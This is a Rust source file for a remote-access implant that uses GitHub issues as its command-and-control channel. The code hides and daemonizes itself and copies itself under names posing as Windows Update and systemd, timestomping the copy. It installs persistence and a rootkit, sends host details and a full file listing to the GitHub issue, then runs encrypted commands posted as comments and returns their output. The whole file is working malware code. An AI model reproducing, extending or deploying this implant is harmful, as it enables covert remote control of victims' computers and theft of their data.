#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod crypto;
mod uuid_gen;
mod commands;
mod files;
mod sysinfo;
mod persist;
mod scan;
mod timewindow;
mod selfdel;
mod filetransfer;
mod linux_sensitive;
mod rootkit;
mod backup_config;

use std::time::Duration;
use tokio::time::sleep;
use uuid_gen::get_or_create_agent_id;
use std::fs;
use std::path::PathBuf;

fn debug_log(msg: &str) {
    let enable_debug = std::env::var("ENABLE_DEBUG").as_ref().map(|s| s.as_str()).ok()
        .or_else(|| option_env!("ENABLE_DEBUG"))
        .unwrap_or("0") == "1";

    if enable_debug {
        #[cfg(windows)]
        let log_path = {
            let username = whoami::username();
            format!(r"C:\Users\{}\AppData\Local\.config\agent_debug.log", username)
        };

        #[cfg(unix)]
        let log_path = {
            let is_root = unsafe { libc::geteuid() == 0 };
            if is_root {
                "/var/log/.systemd-debug.log".to_string()
            } else {
                let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
                format!("{}/.local/share/.agent-debug.log", home)
            }
        };

        if let Ok(metadata) = std::fs::metadata(&log_path) {
            if metadata.len() > 10 * 1024 * 1024 {
                let _ = std::fs::remove_file(&log_path);
            }
        }

        let log = format!("[{}] {}\n", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"), msg);

        if let Some(parent) = PathBuf::from(&log_path).parent() {
            let _ = fs::create_dir_all(parent);
        }

        let _ = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
            .and_then(|mut f| std::io::Write::write_all(&mut f, log.as_bytes()));
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Agent starting...");

    #[cfg(unix)]
    {
        let exe_name = std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
            .unwrap_or_default();

        if !exe_name.is_empty() {
            let output = std::process::Command::new("pgrep")
                .args(&["-c", "-x", &exe_name])
                .output();

            if let Ok(o) = output {
                if let Ok(count_str) = String::from_utf8(o.stdout) {
                    if let Ok(count) = count_str.trim().parse::<i32>() {
                        if count > 1 {
                            std::process::exit(0);
                        }
                    }
                }
            }
        }
    }

    #[cfg(unix)]
    if std::env::var("DAEMONIZED").is_err() {
        unsafe {
            let pid = libc::fork();
            if pid > 0 {
                println!("Agent running in background (PID: {})", pid);
                std::process::exit(0);
            } else if pid == 0 {
                std::env::set_var("DAEMONIZED", "1");
                libc::setsid();
            }
        }
    }

    std::panic::set_hook(Box::new(|panic_info| {
        let msg = format!("PANIC: {:?}", panic_info);
        debug_log(&msg);
        eprintln!("{}", msg);
    }));

    debug_log("Agent starting...");

    let enable_persistence = option_env!("ENABLE_PERSISTENCE")
        .unwrap_or("0") == "1" || std::env::var("ENABLE_PERSISTENCE").unwrap_or_default() == "1";

    if enable_persistence && std::env::var("RELOCATED").is_err() {
        if let Ok(new_path) = relocate_self() {
            debug_log(&format!("Relocated to: {}", new_path));
            return Ok(());
        }
    }

    let mut config = Config::from_env();

    if config.github_token == "TOKEN" || config.github_token.is_empty() {
        eprintln!("ERROR: GitHub Token not configured");
        debug_log("ERROR: GitHub Token not configured");
        std::process::exit(1);
    }

    println!("Config loaded: repo={}/{}", config.github_owner, config.github_repo);
    debug_log(&format!("Config: repo={}/{}", config.github_owner, config.github_repo));

    let agent_id = get_or_create_agent_id();
    println!("Agent ID: {}", agent_id);
    debug_log(&format!("Agent ID: {}", agent_id));

    let enable_persistence = std::env::var("ENABLE_PERSISTENCE").as_ref().map(|s| s.as_str()).ok()
        .or_else(|| option_env!("ENABLE_PERSISTENCE"))
        .unwrap_or("0") == "1";
    if enable_persistence && std::env::var("SKIP_PERSIST").is_err() {
        println!("Installing persistence...");
        debug_log("Installing persistence...");
        let _ = crate::persist::install_persistence();
        std::env::set_var("SKIP_PERSIST", "1");
    }

    #[cfg(unix)]
    {
        let enable_rootkit = std::env::var("ENABLE_ROOTKIT").as_ref().map(|s| s.as_str()).ok()
            .or_else(|| option_env!("ENABLE_ROOTKIT"))
            .unwrap_or("0") == "1";
        if enable_rootkit && std::env::var("SKIP_ROOTKIT").is_err() {
            println!("Installing rootkit...");
            debug_log("Installing rootkit...");
            match crate::rootkit::install_rootkit() {
                Ok(msg) => debug_log(&msg),
                Err(e) => debug_log(&format!("Rootkit install failed: {}", e)),
            }
            std::env::set_var("SKIP_ROOTKIT", "1");
        }
    }

    println!("Starting main loop...");
    debug_log("Starting main loop...");

    loop {
        match run_agent(&config, &agent_id).await {
            Ok(_) => break,
            Err(e) => {
                let err_str = e.to_string();

                if err_str.contains("Config updated") {
                    debug_log("Reloading config...");
                    config = Config::from_env();
                    sleep(Duration::from_secs(5)).await;
                    continue;
                }

                debug_log(&format!("Error: {}, retrying in 60s...", e));
                eprintln!("Error: {}, retrying in 60s...", e);
                sleep(Duration::from_secs(60)).await;
            }
        }
    }

    Ok(())
}

fn relocate_self() -> Result<String, Box<dyn std::error::Error>> {
    let current_exe = std::env::current_exe()?;

    #[cfg(windows)]
    let target_path = {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\WindowsUpdate.exe", username)
    };

    #[cfg(unix)]
    let target_path = {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/lib/systemd/systemd-log".to_string()
        } else {
            debug_log("Not root, skipping relocation");
            return Err("Not root".into());
        }
    };

    if current_exe.to_string_lossy() == target_path {
        std::env::set_var("RELOCATED", "1");
        return Err("Already relocated".into());
    }

    if let Some(parent) = PathBuf::from(&target_path).parent() {
        fs::create_dir_all(parent)?;
    }

    fs::copy(&current_exe, &target_path)?;

    #[cfg(unix)]
    {
        let reference_files = [
            "/lib/systemd/systemd",
            "/usr/lib/systemd/systemd",
            "/bin/systemd",
            "/sbin/init",
        ];

        for ref_file in &reference_files {
            if let Ok(metadata) = fs::metadata(ref_file) {
                if let Ok(modified) = metadata.modified() {
                    use filetime::{FileTime, set_file_times};
                    let ft = FileTime::from_system_time(modified);
                    let _ = set_file_times(&target_path, ft, ft);
                    break;
                }
            }
        }

        std::process::Command::new("chmod")
            .args(&["755", &target_path])
            .output()?;
    }

    #[cfg(windows)]
    {
        std::process::Command::new(&target_path)
            .env("RELOCATED", "1")
            .spawn()?;
    }

    #[cfg(unix)]
    {
        std::process::Command::new("chmod")
            .args(&["+x", &target_path])
            .output()?;

        std::process::Command::new(&target_path)
            .env("RELOCATED", "1")
            .spawn()?;
    }

    #[cfg(unix)]
    {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = fs::remove_file(&current_exe);
    }

    #[cfg(windows)]
    {
        let exe_str = current_exe.to_string_lossy().to_string();
        let _ = std::process::Command::new("cmd")
            .args(&["/c", &format!("timeout /t 3 /nobreak >nul & del \"{}\"", exe_str)])
            .spawn();
    }

    Ok(target_path)
}

async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Connecting to GitHub...");
    debug_log("Connecting to GitHub...");

    println!("Creating or loading issue...");
    debug_log("Creating or loading issue...");
    let (issue_number, is_new_issue) = create_or_load_issue(&config, &agent_id).await?;
    println!("Issue number: {}", issue_number);
    debug_log(&format!("Issue number: {}", issue_number));

    let mut last_comment_id = load_last_comment_id();
    let mut failure_count = 0u32;
    let mut backoff_multiplier = 1u64;
    let mut consecutive_failures = 0u32;
    let is_first_run = is_new_issue;
    let mut last_activity_time = std::time::Instant::now();

    debug_log("Entering main loop...");

    if is_first_run {
        debug_log("First run, sending initial file list...");
        let default_path = if cfg!(windows) { "DRIVES" } else { "/" };
        let output = crate::files::list_files(default_path);
        if let Err(e) = send_response_chunks(&config, issue_number, &output).await {
            debug_log(&format!("Failed to send initial file list: {}", e));
        } else {
            last_activity_time = std::time::Instant::now();
            debug_log("Initial file list sent");
        }
    }

    loop {
        if !crate::timewindow::is_in_active_window() {
            debug_log("Outside active window, sleeping 10 minutes");
            sleep(Duration::from_secs(600)).await;
            continue;
        }

        debug_log("Checking for commands...");
        match check_commands(&config, issue_number, &mut last_comment_id).await {
            Ok(had_cmd) => {
                debug_log(&format!("Command check OK, had_cmd: {}", had_cmd));
                if had_cmd {
                    last_activity_time = std::time::Instant::now();
                }
                failure_count = 0;
                backoff_multiplier = 1;
                consecutive_failures = 0;
            }
            Err(e) => {
                debug_log(&format!("Command check error: {}", e));
                let err_msg = e.to_string();
                debug_log(&format!("Command check error: {}", err_msg));

                consecutive_failures += 1;

                if consecutive_failures >= 5 && !config.backup_url.is_empty() {
                    debug_log("Attempting to fetch backup config...");
                    let backup_url = config.backup_url.clone();
                    let result = tokio::task::spawn_blocking(move || {
                        crate::backup_config::fetch_backup_config(&backup_url)
                    }).await;

                    match result {
                        Ok(Ok(backup)) => {
                            debug_log("Backup config fetched, applying new config...");
                            crate::backup_config::apply_backup_config(&backup);

                            let _ = fs::remove_file(get_issue_file_path());

                            return Err("Config updated, restart required".into());
                        }
                        Ok(Err(e)) => {
                            debug_log(&format!("Failed to fetch backup config: {}", e));
                        }
                        Err(e) => {
                            debug_log(&format!("Backup config task failed: {}", e));
                        }
                    }
                }

                if err_msg.contains("401") || err_msg.contains("Unauthorized") {
                    debug_log("Token invalid");
                }

                if err_msg.contains("404") {
                    debug_log("Issue not found, recreating...");
                    let _ = fs::remove_file(get_issue_file_path());
                    return Err("Issue deleted".into());
                }

                failure_count += 1;

                if err_msg.contains("429") || err_msg.contains("rate limit") {
                    backoff_multiplier = 30;
                    debug_log("Rate limited, backing off 30 minutes");
                } else if failure_count > 3 {
                    backoff_multiplier = (backoff_multiplier * 2).min(12);
                }
            }
        }

        let has_recent_activity = last_activity_time.elapsed().as_secs() < 1200;
        let base_interval = if has_recent_activity { config.poll_interval } else { 300 };
        let interval = base_interval * backoff_multiplier;
        let jitter = (rand::random::<f64>() * 0.4 - 0.2) * interval as f64;
        let final_interval = (interval as f64 + jitter).max(1.0) as u64;

        sleep(Duration::from_secs(final_interval)).await;
    }
}

struct Config {
    github_token: String,
    github_owner: String,
    github_repo: String,
    password: String,
    backup_url: String,
    poll_interval: u64,
}

impl Config {
    fn from_env() -> Self {
        let token = std::env::var("GITHUB_TOKEN").ok()
            .or_else(|| option_env!("GITHUB_TOKEN").map(|s| s.to_string()))
            .unwrap_or_else(|| "TOKEN".to_string());

        let repo = std::env::var("GITHUB_REPO").ok()
            .or_else(|| option_env!("GITHUB_REPO").map(|s| s.to_string()))
            .unwrap_or_else(|| "owner/repo".to_string());

        let password = std::env::var("ENCRYPTION_PASSWORD").ok()
            .or_else(|| option_env!("ENCRYPTION_PASSWORD").map(|s| s.to_string()))
            .unwrap_or_else(|| "password".to_string());

        let backup_url = std::env::var("BACKUP_URL").ok()
            .or_else(|| option_env!("BACKUP_URL").map(|s| s.to_string()))
            .unwrap_or_default();

        let poll_interval = std::env::var("POLL_INTERVAL").ok()
            .or_else(|| option_env!("POLL_INTERVAL").map(|s| s.to_string()))
            .and_then(|s| s.parse().ok())
            .unwrap_or(5);

        let parts: Vec<&str> = repo.split('/').collect();

        Self {
            github_token: token,
            github_owner: parts.get(0).unwrap_or(&"owner").to_string(),
            github_repo: parts.get(1).unwrap_or(&"repo").to_string(),
            password,
            backup_url,
            poll_interval,
        }
    }
}

async fn create_or_load_issue(
    config: &Config,
    agent_id: &str,
) -> Result<(u64, bool), Box<dyn std::error::Error>> {
    let issue_file = get_issue_file_path();

    if let Ok(content) = fs::read_to_string(&issue_file) {
        if let Ok(num) = content.trim().parse::<u64>() {
            if verify_issue_exists(config, num).await {
                return Ok((num, false));
            } else {
                debug_log("Cached issue not found, will create new one");
                let _ = fs::remove_file(&issue_file);
            }
        }
    }

    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
    let username = whoami::username();
    let os = std::env::consts::OS;
    let title = format!("{}::{}::{}", hostname, agent_id, username);
    let sysinfo = crate::sysinfo::collect_sysinfo();
    let body = format!("Agent ID: {}\nOS: {}\n\n{}", agent_id, os, sysinfo);

    let url = format!("https://api.github.com/repos/{}/{}/issues", config.github_owner, config.github_repo);
    let payload = serde_json::json!({
        "title": title,
        "body": body,
        "labels": ["agent"]
    });

    let resp = ureq::post(&url)
        .set("Authorization", &format!("token {}", config.github_token))
        .set("User-Agent", "github-c2-agent")
        .send_json(&payload)?;

    let issue: serde_json::Value = resp.into_json()?;
    let issue_number = issue["number"].as_u64().ok_or("No issue number")?;

    if let Some(parent) = PathBuf::from(&issue_file).parent() {
        fs::create_dir_all(parent).ok();
    }
    fs::write(&issue_file, issue_number.to_string())?;

    Ok((issue_number, true))
}

async fn verify_issue_exists(config: &Config, issue_number: u64) -> bool {
    let url = format!("https://api.github.com/repos/{}/{}/issues/{}",
        config.github_owner, config.github_repo, issue_number);

    ureq::get(&url)
        .set("Authorization", &format!("token {}", config.github_token))
        .set("User-Agent", "github-c2-agent")
        .call()
        .is_ok()
}

fn get_issue_file_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\issue.txt", username)
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/lib/systemd/.issue".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
            format!("{}/.local/share/.issue", home)
        }
    }
}

pub fn get_issue_file_path_public() -> String {
    get_issue_file_path()
}

fn get_last_comment_file_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\last_comment.txt", username)
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/lib/systemd/.last_comment".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
            format!("{}/.local/share/.last_comment", home)
        }
    }
}

fn save_last_comment_id(id: u64) {
    let path = get_last_comment_file_path();
    let _ = std::fs::write(&path, id.to_string());
}

fn load_last_comment_id() -> u64 {
    let path = get_last_comment_file_path();
    std::fs::read_to_string(&path)
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(0)
}

async fn check_commands(
    config: &Config,
    issue_number: u64,
    last_comment_id: &mut u64,
) -> Result<bool, Box<dyn std::error::Error>> {
    let mut page = 1;
    let mut all_comments: Vec<serde_json::Value> = Vec::new();

    loop {
        let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments?per_page=100&page={}",
            config.github_owner, config.github_repo, issue_number, page);

        let resp = ureq::get(&url)
            .set("Authorization", &format!("token {}", config.github_token))
            .set("User-Agent", "github-c2-agent")
            .call()?;

        let comments: Vec<serde_json::Value> = resp.into_json()?;
        let count = comments.len();
        all_comments.extend(comments);
        if count < 100 { break; }
        page += 1;
    }

    let mut had_activity = false;

    for comment in all_comments.iter().rev() {
        let comment_id = comment["id"].as_u64().unwrap_or(0);
        if comment_id <= *last_comment_id {
            break;
        }

        if let Some(body) = comment["body"].as_str() {
            if body.starts_with("[CMD]") {
                debug_log(&format!("Found command comment ID: {}", comment_id));
                let encrypted = body.strip_prefix("[CMD]").unwrap_or(body);
                match crate::crypto::decrypt(encrypted, &config.password) {
                    Ok(decrypted) => {
                        debug_log(&format!("Decrypted command: {}", decrypted));
                        let output = crate::commands::execute_command(&decrypted);
                        debug_log(&format!("Command output length: {}", output.len()));

                        send_response_chunks(&config, issue_number, &output).await?;

                        had_activity = true;
                        *last_comment_id = comment_id;
                        save_last_comment_id(*last_comment_id);
                        debug_log("Response sent successfully");
                    }
                    Err(e) => {
                        debug_log(&format!("Decryption failed: {}", e));
                    }
                }
            }
        }
    }

    Ok(had_activity)
}

async fn send_response_chunks(
    config: &Config,
    issue_number: u64,
    output: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    const CHUNK_SIZE: usize = 50000;

    let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments",
        config.github_owner, config.github_repo, issue_number);

    if output.len() <= CHUNK_SIZE {
        let encrypted = crate::crypto::encrypt(output, &config.password)?;
        let response = format!("[RESP]{}", encrypted);
        let payload = serde_json::json!({"body": response});

        ureq::post(&url)
            .set("Authorization", &format!("token {}", config.github_token))
            .set("User-Agent", "github-c2-agent")
            .send_json(&payload)?;
    } else {
        let mut chunks = Vec::new();
        let bytes = output.as_bytes();
        let mut start = 0;
        while start < bytes.len() {
            let mut end = (start + CHUNK_SIZE).min(bytes.len());
            while end < bytes.len() && !output.is_char_boundary(end) {
                end += 1;
            }
            chunks.push(&output[start..end]);
            start = end;
        }
        let total_chunks = chunks.len();

        for (i, chunk) in chunks.iter().enumerate() {
            let msg = format!("[Part {}/{}]\n{}", i + 1, total_chunks, chunk);
            let encrypted = crate::crypto::encrypt(&msg, &config.password)?;
            let response = format!("[RESP]{}", encrypted);
            let payload = serde_json::json!({"body": response});

            ureq::post(&url)
                .set("Authorization", &format!("token {}", config.github_token))
                .set("User-Agent", "github-c2-agent")
                .send_json(&payload)?;

            tokio::time::sleep(Duration::from_millis(500)).await;
        }
    }

    Ok(())
}
